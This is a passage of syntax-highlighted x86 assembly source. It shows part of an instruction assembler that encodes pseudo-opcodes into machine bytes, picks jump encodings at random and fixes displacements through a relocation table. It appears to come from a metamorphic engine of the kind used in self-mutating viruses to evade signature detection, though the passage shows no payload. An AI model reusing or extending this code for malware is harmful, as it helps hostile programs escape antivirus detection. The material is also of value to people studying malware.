                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_SHIFT8Mem_1_00</span><span class="sc0">
     </span><span class="sc5">@@Assemble_SHIFT8Mem_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_SHIFT8Mem_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_SHIFTMem_x</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next22</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">       </span><span class="sc1">; LEA Reg,[Mem]?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next23</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc0">        </span><span class="sc1">; Then, insert a LEA opcode (8D), set</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; in bits 5,4,3 the destiny register</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; and code the memory address.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next23</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc0">       </span><span class="sc1">; Direct byte insertion?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next24</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Then, insert it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_StoreByte</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next24</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">       </span><span class="sc1">; RET?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next25</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">       </span><span class="sc1">; Then, insert the RET opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_StoreByte</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next25</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">       </span><span class="sc1">; NOP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next26</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">; Then, insert the NOP opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_StoreByte</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next26</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">        </span><span class="sc1">; Jcc?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Assemble_Next27</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@Assemble_Next27</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the type of jump: normal or</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;  inversed (JNZ/JMP rather than JZ)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Normal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Inverse the condition</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; Save the EIP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">       </span><span class="sc1">; Make a JMP to the label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">@@Assemble_Jump_Normal</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Get the old EIP in EBX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Get the current EIP</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Calculate the displacement in EAX</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Add 1 to overpass the Jcc itself</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Store the displacement</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Next27</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">       </span><span class="sc1">; MOVZX Reg,[Mem8]?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Next28</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B60Fh</span><span class="sc0">     </span><span class="sc1">; Set the MOVZX opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the register and bind it to the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">; memory address codification in the</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; 2nd opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_MakeMemoryAddress</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Next28</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc1">; cmp     eax, 0E8h       ; Here only can be opcodes E8 or E9</span><span class="sc0">
               </span><span class="sc1">; jmp   @@Assemble_Jump_Normal</span><span class="sc0">


     </span><span class="sc5">@@Assemble_Jump_Normal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the label</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the pointed address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Have we coded it already?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Backwards</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Jump_Fowards</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Get the distance</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0"> </span><span class="sc1">; 11 (max size of instruction) * 0Bh = 121.</span><span class="sc0">
                                  </span><span class="sc1">; It must be &lt; 128 to code a short Jcc</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_JmpFwd_Short</span><span class="sc0">
     </span><span class="sc5">@@Assemble_JmpFwd_Long_Set00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">            </span><span class="sc1">; Jcc?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Assemble_JmpFwd_Long_Jcc</span><span class="sc0">
     </span><span class="sc5">@@Assemble_JmpFwd_Long_Set</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_AddToRelocTable</span><span class="sc0"> </span><span class="sc1">; Add it to the post-assembly</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">              </span><span class="sc1">; relocation work</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_JmpFwd_Long_Jcc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; Set the opcode 0F</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the Jcc opcode, add 10h to it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">         </span><span class="sc1">; (by x86 specifications :) and set</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_JmpFwd_Long_Set</span><span class="sc0"> </span><span class="sc1">; it in the same way the</span><span class="sc0">
                                                 </span><span class="sc1">; short one.</span><span class="sc0">
     </span><span class="sc5">@@Assemble_JmpFwd_Short</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; Get a random decision over the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; codification of this jump: short</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; or long? (long with a 1/8 of prob.)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_JmpFwd_Long_Set00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                 </span><span class="sc1">; CALL?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_JmpFwd_Long_Set</span><span class="sc0">  </span><span class="sc1">; Then, set long for sure</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                 </span><span class="sc1">; JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_JmpFwd_Short_JMP</span><span class="sc0"> </span><span class="sc1">; Then, set short</span><span class="sc0">
     </span><span class="sc5">@@Assemble_JmpFwd_Short_Set</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Asm_AddToRelocTable</span><span class="sc0">       </span><span class="sc1">; Add it to post-assembly</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; relocations</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_JmpFwd_Short_JMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Convert the E9 opcode to EB</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_JmpFwd_Short_Set</span><span class="sc0">

     </span><span class="sc5">@@Assemble_Jump_Backwards</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the address of the label</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Get the displacement in EBX</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF80h</span><span class="sc0">   </span><span class="sc1">; If backwards displacement &lt;= 128,</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Backwards_Long</span><span class="sc0"> </span><span class="sc1">; we can use short jumps.</span><span class="sc0">
                                                     </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">          </span><span class="sc1">; If it's CALL, it's long (and just</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Backwards_Long</span><span class="sc0"> </span><span class="sc1">; imagine a fist hitting</span><span class="sc0">
                                                   </span><span class="sc1">; a table categorically XD)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Get a random decision to code it</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Backwards_Long</span><span class="sc0"> </span><span class="sc1">; short or long</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">          </span><span class="sc1">; JMP opcode?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Jump_StoreOpcode_Short</span><span class="sc0"> </span><span class="sc1">; If not, jump</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                          </span><span class="sc1">; Make it 0EBh</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Jump_StoreOpcode_Short</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Store the displacement</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Jump_Backwards_Long</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">                     </span><span class="sc1">; JMP?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Backwards_JMP</span><span class="sc0">  </span><span class="sc1">; Then, jump there</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">                     </span><span class="sc1">; CALL?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Assemble_Jump_Backwards_JMP</span><span class="sc0">  </span><span class="sc1">; Then, jump there</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; Subtract the length that we haven't</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; subtracted yet</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set the first opcode of the long Jcc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Set the 2nd opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Jump_Backwards_Long_Common</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; Set the displacement</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">@@Assemble_Jump_Backwards_JMP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; Set the opcode (JMP or CALL)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Assemble_Jump_Backwards_Long_Common</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">AssembleInstruction</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function adds the current storage EIP to the post-assembly relocation</span><span class="sc0">
</span><span class="sc1">;; table. After all the code is assembled, we'll fix the displacements stored</span><span class="sc0">
</span><span class="sc1">;; in this table.</span><span class="sc0">
</span><span class="sc5">Asm_AddToRelocTable</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">JumpRelocationTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the last element</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumpRelocations</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; of the table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; Store the address for fixing</span><span class="sc0">
